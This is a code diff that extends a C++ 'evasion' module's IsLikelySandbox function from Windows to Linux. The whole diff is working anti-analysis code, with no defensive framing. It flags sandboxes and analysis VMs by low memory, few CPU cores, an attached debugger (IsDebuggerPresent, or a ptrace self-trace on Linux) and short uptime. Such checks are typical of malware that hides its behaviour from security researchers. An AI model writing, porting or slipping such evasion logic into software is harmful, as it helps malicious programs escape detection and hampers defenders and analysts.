@@ -1,28 +1,26 @@
 #include "AntiSandbox.h"
+#ifdef _WIN32
 #include <windows.h>
-
+#else
+#include <sys/sysinfo.h>
+#include <unistd.h>
+#include <sys/ptrace.h>
+#endif
 namespace evasion {
-
 bool IsLikelySandbox() {
-    // 1. Very low memory (most sandboxes < 4 GB)
-    MEMORYSTATUSEX mem;
-    RtlZeroMemory(&mem, sizeof(mem));
-    mem.dwLength = sizeof(mem);
-    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 0x100000000ULL) // < 4GB
-        return true;
-
-    // 2. Single / two cores (very common in analysis VMs)
-    SYSTEM_INFO si; GetSystemInfo(&si);
-    if (si.dwNumberOfProcessors <= 2) return true;
-
-    // 3. Debugger present (many sandboxes attach)
+#ifdef _WIN32
+    MEMORYSTATUSEX mem; mem.dwLength = sizeof(mem);
+    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 0x100000000ULL) return true;
+    SYSTEM_INFO si; GetSystemInfo(&si); if (si.dwNumberOfProcessors <= 2) return true;
     if (IsDebuggerPresent()) return true;
-
-    // 4. Very recent boot (sandboxes often reboot images)
-    ULONGLONG uptime = GetTickCount64() / 1000;
-    if (uptime < 180) return true; // < 3 minutes
-
+    if (GetTickCount64() / 1000 < 180) return true;
+#else
+    struct sysinfo si; if (sysinfo(&si) == 0) {
+        if (si.totalram * si.mem_unit < 4000000000ULL) return true;
+    }
+    if (sysconf(_SC_NPROCESSORS_ONLN) <= 2) return true;
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return true;
+#endif
     return false;
 }
-
-} // namespace evasion
+}
